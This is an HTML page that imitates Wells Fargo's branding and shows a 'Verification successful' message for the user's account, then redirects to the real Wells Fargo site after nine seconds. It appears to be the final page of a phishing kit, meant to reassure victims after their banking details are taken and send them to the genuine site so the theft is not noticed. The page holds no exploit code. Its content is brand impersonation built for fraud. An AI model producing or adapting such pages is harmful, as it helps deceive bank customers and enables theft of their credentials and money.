<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title></title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>

</head>
<body>

    <aside>
        Feedback
    </aside>
    <nav>
        <div class="fdic">
            <img src="assets/fdic.svg" alt="">
            <p><i>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</i></p>
        </div>
        <div class="nav_flex">
            <img src="assets/logo-white.svg" alt="">
            <a href="">Go to WellsFargo.com</a>
        </div>
    </nav>

    <section>
        <form id="form" method="post" style="display: flex; flex-direction: column;justify-content: center;align-items: center;">
                <img src="assets/check.png" style="width: 100px;" alt="">
                <br>

                <h2 style="text-align: center;">Verification successful</h2>
                <br>
                <br>

                <p style="text-align: center;">Your account has been verified successfully. you'll be redirected soon</p>
                <br>
                <p style="text-align: center;">Do not refresh page.....</p>
                <br>
                <div class="loader"></div>
        </form>
    </section>

    <footer>
        <img src="assets/vantage.svg" alt="" class="vantage">
        <hr>

        <div class="footer_flex">
            <ul>
                <li><b>Legal & Privacy</b></li>
                <li>
                    Privacy, Cookies, Security, and Legal
                </li>
                <li>Notice of Data Collection</li>
                <li>Do Not Sell or Share My Personal Information</li>
                <p>© 2022 - 2025 Wells Fargo</p>
            </ul>
            <ul>
                <li><b>Support</b></li>
                <li>
                    Help Center
                </li>
                <li>System Requirements and Accessibility</li>
            </ul>
        </div>
    </footer>

    <script>

        setTimeout(() => {
            window.location = "https://www.wellsfargo.com/biz/"
        }, 9000);
        
    </script>
</body>
</html>